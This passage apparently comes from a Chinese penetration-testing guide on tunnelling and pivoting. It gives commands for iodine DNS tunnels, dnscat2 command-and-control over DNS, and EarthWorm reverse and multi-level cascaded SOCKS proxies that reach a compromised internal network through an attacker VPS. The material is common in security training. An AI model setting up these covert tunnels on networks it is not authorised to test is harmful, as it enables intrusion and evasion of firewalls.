它几乎是和hans icmp隧道工具一样的工作机制，它在它们之间创建一对tun适配器和隧道数据作为DNS查询。[使用手册](http://dev.kryo.se/iodine/wiki/HowtoSetup)   
Server端：  
`iodined -f -c -P password 1.1.1.1 tunneldomain.com`  
Client端：  
`iodine -f -P password tunneldomain.com -r`  
成功连接将直接在客户端生成地址1.1.1.2。请注意，这种隧道技术的速度相当慢。最好的办法是在生成的连接上使用ssh连接：  
`ssh @1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080`  
### Dnscat2
[Dnscat2](https://github.com/iagox86/dnscat2) 通过建立C&C通道递归DNS查询。此工具不需要root/administrator权限（在Windows和Linux上都可以使用），它还支持端口转发。    
Server端：    
`ruby ./dnscat2.rb tunneldomain.com`  
Client端：  
`./dnscat2 tunneldomain.com`  
收到Server端的连接后，可以使用windows命令查看活动会话：  
```
dnscat2> windows
0 :: main [active]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]
  1 :: command session (debian)
  2 :: sh (debian) [*]
```
要启动端口转发，请选择一个命令会话session -i ：  
```
dnscat2> session -i 1
New window created: 1
New window created: 1
history_size (session) => 1000
This is a command session!
That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.
command session (debian) 1>
```
使用listen [lhost:]lport rhost:rport命令转发端口：  
`command session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80`  
这将绑定靶机上的端口8080，并将所有连接转发到10.0.0.20:80。  
## TCP隧道
### shootback
[shootback](https://github.com/aploium/shootback)，是由python开发的反向TCP隧道，使得NAT或防火墙后的内网机器可以被外网访问。在800并发下消耗小于1％的CPU和8MB内存。  
….
## SOCKS  
在实际渗透测试过程中，当我们成功的拿下第一台靶机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。  
### socks代理工具
socks代理其实也可理解为一个增强版的 lcx，它在服务端监听一个服务端口，当有新的连接请求时会从socks协议中解析出访问目标的URL的目标端口，再开始执行lcx的具体功能。  
网络上Socks代理工具有很多，选用的时候尽可能使用无GUI界面的工具，还有尽可能不需要安装其他依赖软件，能够支持多平台操作系统的更佳。  
### Earthworm
工具网址：http://rootkiter.com/EarthWorm  
EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以正向、反向、多级级联等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。  
工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。  
目前已经有了最新版Termite，工具网址：http://rootkiter.com/Termite/  
官方提供的方法就已经很好了，配套的Termite更不错，Termite中，只要节点互通，就可以任意切换代理。  
### 正向 SOCKS v5 服务器
在具有公网IP时：  
`./ew -s ssocksd -l 1080`  
### 反弹 SOCKS v5 服务器
先在一台具有公网 ip :233.233.233.233的主机A上运行以下命令：  
`./ew -s rcsocks -l 1080 -e 8888`  
在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口  
`./ew -s rssocks -d 233.233.233.233 -e 8888`  
HackTools 可通过访问=233.233.233.233:1080端口使用 rssocks 主机提供的 socks5 代理服务  
### 二级级联
环境示意图：  
![](../pictures/porttransfer3.png)    
环境说明（一）：V1主机配有2块网卡，一块连通外网，一块10.255.11.8只能连接内网V2主机，无法访问内网其它资源。V2主机可以访问内网资源，但无法访问外网。  
```
# V2执行，利用ssocksd方式启动8888端口的socks代理
./ew -s ssocksd -l 8888
# V1执行，将来自外部的1080端口的代理请求转发到V2的8888端口上
./ew -s lcx_tran -l 1080 -f 10.255.11.3 -g 8888
# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口
```
环境说明（二）：V1主机没有公网IP，也无法访问内网资源。V2主机可以访问内网资源，但无法访问外网。  
```
# VPS执行，把来自外部的1080端口的流量转到本地的8888端口上
./ew –s lcx_listen –l 1080 –e 8888
# V2执行，在本地启动socks5代理并监听9999端口
./ew -s ssocksd -l 9999
# V1执行，把vps的8888端口和V2的9999进行绑定,即建立socks5通道
./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.11.3 -g 9999
# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口
```
### 三级级联
再提供一个“三级级联”的本地SOCKS测试用例以供参考    
环境示意图：    
![](../pictures/porttransfer4.png)    
环境说明：Web server没有公网IP但可以访问外网，V2主机不能访问外网但可以被Web server主机访问，V3主机可被V2主机访问且能访问核心区域  
```
# vps上执行，把来自外部的1080端口流量转到本地的8888端口上
./ew -s rcsocks -l 1080 -e 8888  
# Web server执行，把vps的8888端口和内网V2的9999端口绑定
./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.12.2 -g 9999 
# V2执行，将来自外部的7777端口和本地的9999端口进行绑定
./ew -s lcx_listen -l 9999 -e 7777 
# V3执行，将本地的socks连接反弹到V2的7777端口上
./ew -s rssocks -d 10.255.12.2 -e 7777 
# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口
```
数据流向: Attack(SOCKS v5) -> 1080 -> 8888 -> 9999 -> 7777 -> rssocks  